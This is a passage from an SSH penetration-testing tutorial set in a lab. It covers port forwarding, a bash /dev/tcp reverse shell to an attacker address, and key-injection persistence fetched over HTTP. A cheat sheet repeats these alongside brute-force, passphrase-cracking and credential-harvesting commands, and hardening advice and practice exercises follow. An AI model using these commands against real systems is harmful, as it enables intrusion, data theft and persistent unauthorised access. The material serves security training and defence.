tcp6       0      0 :::22                   :::*                    LISTEN      -                   
```

Three facts leap out of this output. The database on port 3306 and the web application on port 8080 are bound to `127.0.0.1`, the loopback interface, which means the kernel will only accept connections that originate *from the machine itself*. That is a deliberate and usually sensible hardening decision: neither service is reachable from the network, so neither one needs to defend itself against the internet. From the attacker's machine, a connection attempt to `192.168.1.9:8080` will fail with a connection refused, because the packet arrives on the external interface and the listening socket simply is not bound to it. And the SSH daemon, by contrast, is bound to `0.0.0.0` — everything — which is how we got in.

The mistake beginners make at this point is to assume the internal services are now unreachable and move on. In fact, the authenticated SSH session we already hold is exactly the tool for reaching them, because SSH can forward TCP connections. **Local port forwarding** opens a listening socket on the attacker's machine and, for every connection it accepts, asks the SSH server to open a connection to a specified address *from the server's own point of view*. Since the server can reach its own loopback interface, a service bound to `127.0.0.1` becomes reachable.

The syntax is `ssh -L <local_bind_address>:<local_port>:<target_host>:<target_port> <user>@<ssh_server>`, and the four fields are worth naming because the command is otherwise unreadable: bind locally to port 8080, and forward to `127.0.0.1:8080` as resolved *on the far side of the connection*.

```bash
root@kali:~# ssh -i key -L 8080:127.0.0.1:8080 pentest@192.168.1.9
Enter passphrase for key 'key': 
Last login: Thu Jan 11 10:46:18 2024 from 192.168.1.9
pentest@ubuntu-lab:~$ 
```

The session looks ordinary, and it is: opening a forward does not print anything, because it is a side effect of the connection rather than a command. With that session alive, opening a browser on the attacker machine at `http://127.0.0.1:8080` — or, for those who prefer the terminal, running a request against it — reaches the internal application, and the traffic is tunnelled inside the encrypted SSH connection and decrypted only on the target:

```bash
root@kali:~# curl -s http://127.0.0.1:8080/ | head -5
<!DOCTYPE html>
<html>
<head>
    <title>Internal Inventory Console</title>
</head>
<body>
root@kali:~# ss -tlnp | grep 8080
LISTEN 0      128        127.0.0.1:8080      0.0.0.0:*    users:(("ssh",pid=4412,fd=4))
```

The `ss` output is the confirmation that the first half of the tunnel exists: an `ssh` process on the attacker machine is now listening on local port 8080. (Note that it is bound to `127.0.0.1` by default, so the forward is available only to the attacker's own machine — which is why a tunnel does not, by itself, expose the internal service to anyone else.)

Several refinements are worth keeping in your notes. Adding `-N` tells the client not to execute a remote command at all, which is the correct form for a pure tunnel: `ssh -i key -N -L 8080:127.0.0.1:8080 pentest@192.168.1.9`. Adding `-f` sends the tunnel to the background after authentication, freeing your terminal; combined, `ssh -i key -fN -L ...` is the canonical "open a tunnel and return" command — with a passphrase-protected key, load it into an agent with `ssh-add` first, or the backgrounded client will have no way to ask you for the passphrase. `-g` allows other hosts to use the local forward, which is a genuinely dangerous flag and should never be used casually. Forwards can also be created from inside an existing session without re-authenticating, using the SSH escape sequence: press Enter, then type `~C`, and the client drops you into a small prompt where `-L 8081:127.0.0.1:3306` adds a second tunnel on the fly. Listing the active ones is the `~#` escape, and closing the session closes every forward it created.

Two other forwarding modes complete the picture, and both matter for assessment work. **Remote forwarding** (`-R`) is the mirror image: it opens a listening port on the *server* and forwards connections back to the attacker's machine, which is how an attacker reaches into a network from outside and is also how many legitimate support tunnels are built. **Dynamic forwarding** (`-D 1080`) turns SSH into a SOCKS proxy: any application configured to use `localhost:1080` as its proxy will have its traffic tunnelled and resolved from the far end, which effectively puts the attacker's browser inside the remote network and is the fastest way to pivot into an internal web estate. With `-D` in place, the sshd log records a single connection, while every internal host visited appears only in the traffic of the tunnel.

From the defender's side, the whole category has one clean mitigation: unless tunnelling is genuinely required, set `AllowTcpForwarding no` in `sshd_config`, which makes the server refuse every forwarding request while leaving ordinary shell sessions working. Where some forwarding must be allowed, `PermitOpen` can restrict destinations to a specific host and port, and `PermitListen` can restrict remote forwards. Beyond the daemon, the useful detective controls are network-side: egress filtering that blocks unexpected outbound connections, and monitoring for sessions that stay open for days without running commands while moving steady quantities of bytes — the unmistakable signature of a tunnel.

---

## 12. Reverse shell — pivoting out via bash TCP

An SSH session is not always the ideal tool. It depends on the remote daemon's configuration, it is logged as an SSH session, it is terminated the moment the daemon is restarted or the configuration changes, and it is not the same thing as a raw, uninstrumented shell on a TCP socket. For some tasks an operator wants a shell that starts *from* the target and connects *to* the attacker — a **reverse shell** — because outbound connections are frequently permitted while inbound ones are not, and because the connection then exists independently of the SSH service. This section builds one out of nothing but the target's own `bash`.

The trick uses a bash feature that surprises many administrators: bash can open a TCP connection using the special device paths `/dev/tcp/<host>/<port>`. It is not a real file, it is a bash-internal redirection that performs the connection, but it means that a payload can be written without any compiler, any scripting language and any binary drop:

```bash
root@kali:~# nc -lvnp 1234
listening on [any] 1234 ...
```

The listener is started first, on the attacker machine, and it uses `nc` (netcat). The flags are worth decoding: `-l` listens rather than connects, `-v` is verbose, `-n` suppresses DNS lookups so that the tool prints the raw address, and `-p 1234` sets the port. The `rlwrap` prefix, if installed, wraps netcat in GNU readline so that arrow keys, command history and line editing work inside the received shell — a small quality-of-life tool that makes a world of difference when the shell you have is a raw one. Without it, the same listener is `nc -lvnp 1234` and behaves identically apart from the missing line editing.

With the listener waiting, the payload is typed into the SSH session we already have on the target:

```bash
pentest@ubuntu-lab:~$ bash -i >& /dev/tcp/192.168.1.17/1234 0>&1
```

The syntax is terse and repays being read carefully. `bash -i` starts an *interactive* shell, which gives us a prompt and job control. `>& /dev/tcp/192.168.1.17/1234` opens a TCP connection to the attacker and redirects both standard output and standard error into it. `0>&1` then points standard input at the same connection, closing the loop so that keystrokes typed by the attacker arrive at the shell. The result is a full-duplex channel between a bash process on the target and the netcat process on the attacker; nothing is written to disk, no binary is dropped, and the target is not listening on any new port.

Over on the attacker machine, the listener prints the connection and hands over a prompt:

```bash
root@kali:~# rlwrap nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.1.17] from (UNKNOWN) [192.168.1.9] 49216
id
uid=1001(pentest) gid=1001(pentest) groups=1001(pentest),27(sudo)
hostname
ubuntu-lab
sudo netstat -ntlp | grep 8080
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      1204/python3
```

The `connect to ... from (UNKNOWN) [192.168.1.9] 49216` line is the target's IP address and the ephemeral source port it chose, and from that point on the attacker types into the shell and reads its output through netcat. Running `netstat` inside this shell is a nice confirmation of the previous section's discovery: the web application really is bound to `127.0.0.1:8080` on the target, which is why a direct connection failed and why a tunnel was needed.

The usual follow-up, once the shell is up, is to turn it into a proper terminal, because the raw shell has no job control, no tab completion and no colours, and interactive programs such as `sudo` or a text editor will misbehave. The standard one-liner does that by starting a new pty with Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Two practical notes. First, this shell is fragile compared with the SSH session: closing the terminal that owns the netcat listener kills the connection, and any accidental `Ctrl+C` may terminate the remote `bash` outright. Operators therefore tend to run the listener inside `tmux` or `screen`, which survives a dropped terminal. Second, the technique has an obvious and well-monitored signature. A connection *originating* from a server to an unusual external port, followed by a long-lived interactive session, is precisely the pattern that egress filtering is designed to prevent and that network monitoring is designed to flag; on a well-run network the payload above simply fails to connect, because the firewall does not permit the target to initiate an outbound session to an arbitrary port. That is the single most effective control against this whole class of technique, and it is far more effective than trying to detect the payload.

---

## 13. Persistent access — key injection

Everything so far has been temporary in one sense: it depends on the password being unchanged, or on the SSH daemon being configured the way it was when the foothold was gained. An attacker who wants to keep access after the victim responds — changing the password, disabling passwords entirely, restarting services — needs a credential of their own. The most direct way to obtain one is to add a *new* public key to the target's `authorized_keys`, using a private key that only the attacker holds. This technique is intrusive and unmistakable in a forensic review, which makes it exactly the sort of thing an assessment should demonstrate and a defender should know how to find.

The first step happens entirely on the attacker's machine: generate a fresh key pair, this time with no passphrase, because the whole point is unattended access.

```bash
root@kali:~# ssh-keygen -t ed25519 -f /root/.ssh/id_ed25519 -N ""
Generating public/private ed25519 key pair.
Your identification has been saved in /root/.ssh/id_ed25519
Your public key has been saved in /root/.ssh/id_ed25519.pub
The key fingerprint is:
SHA256:o2+3Di/ZJSW+ud59uomJvMhyEsj7P3jxcDGlWl5mDTI root@kali
The key's randomart image is:
+--[ED25519 256]--+
|                 |
|          E o    |
|           = o   |
|          * = .  |
|   . .  S= O     |
|    o ..+.= .    |
|     ..o.B =     |
|    . +oB=*o + ..|
|     ..B=*X++ =+ |
+----[SHA256]-----+
root@kali:~# cd .ssh
root@kali:~/.ssh$ ls -al
total 16
drwx------ 2 root root 4096 Jan 11 10:52 .
drwx------ 4 root root 4096 Jan 11 10:50 ..
-rw------- 1 root root  464 Jan 11 10:52 id_ed25519
-rw-r--r-- 1 root root  100 Jan 11 10:52 id_ed25519.pub
root@kali:~/.ssh$ cat id_ed25519.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL9kQ2mXvR1pYt8cJ4dW3nZ6hS0bE7gA5fM2uK9rT3wP root@kali
```

The `-t ed25519` flag chooses the modern elliptic-curve key type and `-N ""` supplies an empty passphrase, which is worth noticing as both a convenience and a liability: this key now grants access to whoever holds the file, with no second factor of any kind. The `ls -al` output shows the payoff of Ed25519 over RSA — the private key is 464 bytes rather than the 2,655 we saw in section 7.1 — and the `cat` shows the public key, a single line in the `ssh-ed25519 <base64> <comment>` format, which is the only part that needs to travel to the target.

The cleanest way to move that one line onto the target is to serve it over HTTP from the attacker and fetch it with the target's own tools, which avoids pasting a long string into a shell and avoids any dependency on the SSH client's file-transfer features.

```bash
root@kali:~/.ssh$ updog -p 80
[+] Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.1.9 - - [11/Jan/2024 10:54:02] "GET /id_ed25519.pub HTTP/1.1" 200 -
```

`updog` is a small Python HTTP server with a directory listing; `python3 -m http.server 80` does the same job with no extra tooling at all. Either way, the attacker machine is now serving the contents of `/root/.ssh/` on port 80, and the request log confirms when the target actually fetches the file. On the target, inside the existing SSH session, the key is downloaded and installed:

```bash
pentest@ubuntu-lab:~$ cd .ssh
pentest@ubuntu-lab:~/.ssh$ wget http://192.168.1.17/id_ed25519.pub -O attacker_key.pub
--2024-01-11 10:54:02--  http://192.168.1.17/id_ed25519.pub
Connecting to 192.168.1.17:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 100 [application/octet-stream]
Saving to: 'attacker_key.pub'

attacker_key.pub                      100%[=====================================>]     100  --.-KB/s    in 0s      

2024-01-11 10:54:02 (12.3 MB/s) - 'attacker_key.pub' saved [100/100]

pentest@ubuntu-lab:~/.ssh$ cat attacker_key.pub >> authorized_keys
pentest@ubuntu-lab:~/.ssh$ ls -al
total 20
drwx------ 2 pentest pentest 4096 Jan 11 10:54 .
drwxr-x--- 5 pentest pentest 4096 Jan 11 10:20 ..
-rw------- 1 pentest pentest  672 Jan 11 10:54 authorized_keys
-rw-r--r-- 1 pentest pentest  100 Jan 11 10:54 attacker_key.pub
-rw------- 1 pentest pentest 2655 Jan 11 10:25 id_rsa
-rw-r--r-- 1 pentest pentest  572 Jan 11 10:25 id_rsa.pub
```

The `authorized_keys` file has grown from 572 bytes to 672 bytes — exactly the size of the key that was appended, which is a tidy piece of arithmetic to be able to do during a review. The file now contains two keys: the one the administrator installed in section 7.2 and the attacker's. Both grant the same access, and nothing on the system distinguishes them to a casual reader, because the format has no field for an owner or a purpose.

With the key installed, the attacker can authenticate from a completely fresh session — and, just as importantly, can still do so after the password has been changed, after password authentication is disabled, and after the daemon is restarted:

```bash
root@kali:~# ssh -i /root/.ssh/id_ed25519 pentest@192.168.1.9
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)
Last login: Thu Jan 11 10:54:11 2024 from 192.168.1.9
pentest@ubuntu-lab:~$ 
```

Note that there is no passphrase prompt, because this key has none, and no password prompt, because password authentication is off. This is unattended, persistent access.

The same capability combines with the tunnelling from section 11, which is where an assessment report usually draws the picture together: one command that authenticates with the injected key *and* opens a forward to the internal application on a new local port.

```bash
root@kali:~# ssh -i /root/.ssh/id_ed25519 -L 7777:127.0.0.1:8080 pentest@192.168.1.9
Last login: Thu Jan 11 10:55:03 2024 from 192.168.1.9
pentest@ubuntu-lab:~$ 
```

The internal application is now reachable at `http://127.0.0.1:7777` on the attacker's machine, over a tunnel authenticated by a key the defender does not know exists.

From the defending side, this section is the most important one in the guide, because the compromise is now *stored on disk* and therefore detectable. The indicators to hunt for are specific: an `authorized_keys` file whose size or modification time has changed without a corresponding change ticket; keys whose comment field names an unrecognised host or user; a process list showing an HTTP fetch of a `.pub` file; and, most simply, any key in `authorized_keys` whose fingerprint does not appear in the organisation's inventory of authorised keys. Because keys are silent and long-lived, the only reliable control is an inventory — know every key, who owns it, why it exists, and when it was last used — combined with strict file permissions on `~/.ssh` (mode `700` for the directory, `600` for `authorized_keys`) so that a low-privileged compromise cannot write there in the first place. Services such as OpenSSH certificates, or a configuration-management system that rewrites `authorized_keys` from a central source on a schedule, remove the entire attack surface by construction, because a file that is rebuilt from a trusted source cannot be persistently modified by hand.

---

## 14. Hardening summary

The lab has now been attacked end to end, and every step of the chain had a control that would have broken it. This section gathers those controls into one place, ordered roughly by how much each one buys.

**Remove password authentication.** Everything in section 4 depends on the server accepting a password over the network. Setting `PasswordAuthentication no` and `KbdInteractiveAuthentication no` removes the entire online guessing category, because there is no secret a human chose for the attacker to guess. The practical prerequisites are a working key for every user who needs access and a way to get a key onto a machine that has just been rebuilt; both are solved by certificate-based access or by an out-of-band provisioning step, and neither is a good reason to keep passwords enabled indefinitely.

**Protect the keys that replace those passwords.** Section 8 is the counterweight to the previous paragraph: disabling passwords is only as strong as the passphrase on the keys that remain. A key protected by a wordlist entry is not a credential, it is a liability. Use long, randomly generated passphrases stored in an agent, and audit the `~/.ssh` directory of every host for keys that should no longer be trusted — because an old key used by someone who left the company three years ago is still a working credential today.

**Disable forwarding unless it is required.** Section 11 showed that an ordinary authenticated account can reach services that no firewall rule protects, because those services trust anything arriving on loopback. `AllowTcpForwarding no` blocks the class; if some forwarding is needed, `PermitOpen` restricts it to specific destinations. On hosts where tunnelling is part of the design, log and alert on forwarding requests.

**Consider whether the port move is worth it.** Section 6 showed that a non-standard port is a filter, not a control. It is cheap, it dramatically reduces automated noise in the logs, and it is worth doing on an internet-facing host. It is not worth doing *instead* of anything else, and it must be documented so that the next administrator does not spend an afternoon working out why port 22 is closed.

**Harden the daemon configuration itself.** Modern OpenSSH offers a compact set of directives that close a great deal of surface: `PermitRootLogin no` (or at least `prohibit-password`), `MaxAuthTries 3` to cut an online attack short, `LoginGraceTime 30` to stop half-open connections accumulating, `AllowUsers` or `AllowGroups` to restrict which accounts may log in at all, and `X11Forwarding no` and `AllowAgentForwarding no` on servers that have no use for them. `sshd -T` shows the effective values, and validating with `sshd -t` before every reload is the difference between a configuration change and an outage.

**Rate-limit and block.** Fail2ban watching `/var/log/auth.log` will ban an address after a handful of failures, which turns a noisy brute-force into a fight against the ban list. A firewall allowing SSH only from known management ranges is stronger still, and an intrusion-prevention system at the network edge adds a layer. None of these replace authentication policy — they buy time and generate evidence — but applied together they make a successful online guessing attack impractical.

**Watch egress as carefully as ingress.** Section 12's reverse shell and section 13's key download both depend on the target being able to start an outbound connection to an attacker-chosen address. Restricting egress to the destinations the server actually needs is the control that defeats the largest number of post-exploitation techniques, and it is much rarer in practice than it should be.

**Instrument and review.** Authentication logs, process accounting, and a review process for privileged files are what turn this entire chain from invisible to obvious. A weekly check that `authorized_keys` files have not changed, an alert on SSH sessions that open a forward, and a report of any host with more than a handful of failed logins will surface everything in this guide.

**Assume compromise and rehearse revocation.** Finally, the operational control that section 10 makes vivid: keep a complete inventory of keys, know where each is authorised, and practise revoking one — on every host, including the ones nobody remembers. An incident response plan that cannot answer "which machines trusted this key?" has not been tested.

---

## 15. Quick reference cheat sheet

| Phase | Command | What it does |
| --- | --- | --- |
| Setup | `sudo apt install openssh-server` | installs the SSH daemon and its SFTP subsystem |
| Setup | `sudo systemctl status ssh --no-pager` | shows the service state and the listening port |
| Setup | `ss -tlnp \| grep sshd` | lists listening TCP sockets with owning process |
| Recon | `nmap -sV -p 22 <target>` | port state plus version detection |
| Recon | `nmap -sV -p- <target>` | full-range scan, finds services on non-standard ports |
| Recon | `nmap --script ssh-auth-methods --script-args="ssh.user=<user>" -p 22 <target>` | lists the authentication methods the server offers |
| Recon | `nc -v <target> 22` | reads the SSH banner in one line |
| Credentials | `hydra -L users.txt -P pass.txt <target> ssh` | dictionary attack against SSH |
| Credentials | `hydra -L users.txt -P pass.txt -s 2222 <target> ssh` | the same against a non-standard port |
| Credentials | `nxc ssh <target> -u users.txt -p '<password>'` | password spray across a user list |
| Access | `ssh <user>@<target>` | interactive session |
| Access | `ssh <user>@<target> 'command'` | run one command, return its output |
| Access | `nxc ssh <target> -u <user> -p <pass> -x 'command'` | run one command without a shell |
| Access | `ssh -t <user>@<target> 'sudo -i'` | interactive command needing a TTY |
| Keys | `ssh-keygen -t ed25519 -a 100` | generate a modern key with a strong KDF |
| Keys | `ssh-keygen -lf ~/.ssh/id_ed25519.pub` | print the key's fingerprint |
| Keys | `cat id_ed25519.pub >> ~/.ssh/authorized_keys` | authorise a key for the current account |
| Keys | `chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys` | enforce the permissions OpenSSH requires |
| Keys | `chmod 600 key && ssh -i key <user>@<target>` | log in with a specific private key |
| Keys | `ssh -T git@<host>` | test authentication without opening a shell |
| Config | `sudo sshd -t` | syntax-check the daemon configuration |
| Config | `sudo sshd -T \| grep -i password` | show the effective (merged) configuration |
| Config | `sudo systemctl reload ssh` | apply configuration changes without dropping sessions |
| Config | `sudo nano /etc/ssh/sshd_config` | edit the server configuration |
| Cracking | `ssh2john id_rsa > sshhash` | convert a private key to a John-compatible hash |
| Cracking | `john -w=/usr/share/wordlists/rockyou.txt sshhash` | dictionary attack against the key passphrase |
| Cracking | `john --show sshhash` | list recovered passphrases |
| Transfer | `scp file.txt <user>@<target>:/path/` | upload over SSH |
| Transfer | `scp <user>@<target>:/path/file .` | download over SSH |
| Transfer | `scp -i key -P 2222 -r <user>@<target>:/dir .` | recursive download with a key and custom port |
| Transfer | `nxc ssh <target> -u <u> -p <p> --put-file local remote` | upload using NetExec |
| Transfer | `nxc ssh <target> -u <u> -p <p> --get-file remote local` | download using NetExec |
| Transfer | `nxc ssh <target> -u <u> --key-file key -p <pass> --get-file remote local` | the same, authenticated with a key |
| Tunnelling | `ssh -i key -L 8080:127.0.0.1:8080 <user>@<target>` | local forward: reach a loopback service |
| Tunnelling | `ssh -i key -fN -L 8080:127.0.0.1:8080 <user>@<target>` | the same, backgrounded, no remote command |
| Tunnelling | `ssh -i key -D 1080 <user>@<target>` | dynamic forward: SOCKS proxy through the host |
| Tunnelling | `ssh -i key -R 9000:127.0.0.1:3000 <user>@<target>` | remote forward: expose a local port on the server |
| Tunnelling | `~C` then `-L 8081:127.0.0.1:3306` | add a forward inside a live session |
| Shell | `bash -i >& /dev/tcp/<attacker>/1234 0>&1` | bash reverse shell |
| Shell | `rlwrap nc -lvnp 1234` | listener with line editing |
| Shell | `python3 -c 'import pty; pty.spawn("/bin/bash")'` | upgrade a raw shell to a full TTY |
| Post-ex | `use post/multi/gather/ssh_creds` | Metasploit module that harvests `.ssh` contents |
| Post-ex | `find / -name "id_*" -o -name "authorized_keys" 2>/dev/null` | locate key material by hand |
| Defence | `find / -name authorized_keys -exec ls -l {} \; 2>/dev/null` | audit every trust file on a host |
| Defence | `journalctl -u ssh --since "1 hour ago"` | review recent authentication activity |

---

## 16. Practice exercises

The following sequence is designed to be run in an isolated lab with two virtual machines and no route to the internet. Each exercise builds on the previous one, and the point of several of them is to observe how a defensive change alters the attacker's output.

1. **Build the range.** Install `openssh-server` on an Ubuntu target, confirm with `ss -tlnp` that it is listening on port 22, then run the version scan from section 2 and identify the MAC vendor from the address your scan reports. Explain, in your own words, why the version string alone identifies the operating system.
2. **Map the authentication surface.** Run the `ssh-auth-methods` script against your target and against a machine on which you have set `PasswordAuthentication no`. Diff the two outputs and describe precisely what an attacker learns from the first but not the second.
3. **Guess a password.** Create your own `users.txt` and `pass.txt` files, run Hydra against your lab target, and record the wall-clock time of the attack. Then re-run it with `-t 2` and compare. Which run would be more likely to trigger a lockout, and why does Hydra's default stop the attack early?
4. **Spray instead.** Using the same user list and a single password, spray the target with NetExec. Compare the number of authentication attempts with exercise 3, and explain why spraying defeats a per-account lockout threshold that brute-forcing does not.
5. **Three ways in.** Log in interactively, run a command remotely, and open a Meterpreter session via `exploit/multi/ssh/sshexec`. For each method, list one thing an investigator monitoring the host would see that is not visible in the other two.
6. **Move the service.** Change the SSH port to 2222, restart the daemon, and verify from the attacker machine that port 22 is closed and 2222 is open. Re-run Hydra against the new port. Then run a full-range scan and time how long it takes to rediscover the service. Write a paragraph explaining to a non-technical manager what the port change did and did not achieve.
7. **Close the door.** Generate a key pair, install the public key, disable password authentication, verify with the authentication-methods script, and then attempt a Hydra attack again. Record the exact error Hydra prints and explain what the server did to produce it.
8. **Steal and crack.** Copy the private key off the target, then deliberately break its permissions with `chmod 644` and observe the client's refusal. Correct the permissions and log in. Then run `ssh2john` and John against the key with a short passphrase, and repeat with a twenty-character random passphrase. Time both runs and plot, on paper, how the crack time would scale with passphrase length under the same KDF.
9. **Exfiltrate three ways.** Retrieve `/etc/passwd` using SCP, using NetExec's `--get-file`, and using `ssh host 'cat /etc/passwd' > local`. Diff the three copies to convince yourself they are identical, and then explain why `/etc/shadow` would have failed on all three.
10. **Harvest automatically.** With a Meterpreter session open, run `post/multi/gather/ssh_creds` and identify every artefact it produced in the loot directory. Then close the session, and use one of those artefacts to log back in without a password.
11. **Tunnel in.** Start an internal-only web service on the target, bound to `127.0.0.1` on a port of your choosing. Confirm from the attacker that it is unreachable. Then reach it with `-L`, and with `-D` plus a browser's proxy setting. Finally, set `AllowTcpForwarding no`, reload, and confirm that both techniques fail while ordinary shell access still works.
12. **Catch a shell.** Start a listener and obtain a bash `/dev/tcp` reverse shell from the target. Then add an egress firewall rule that blocks the target from connecting to the attacker's port and explain what changes from the attacker's point of view.
13. **Persist, then detect.** Inject a new public key into `authorized_keys`, confirm passwordless access with it, and then put on the defender's hat: list every file in `~/.ssh` with timestamps, identify the injected key by its comment field, and write the one-line `find` command that would have found it on a host you had never seen before.
14. **Write the report.** Summarise the whole chain as a five-hundred-word finding: the initial weakness, the exploitation path, the business impact, and the three controls that would each have independently prevented it.

Working through those fourteen exercises end to end will have taken you through every command in this guide at least once and, more usefully, through the reasoning behind each of them — which is the part that transfers to a different target, a different service and a different engagement.
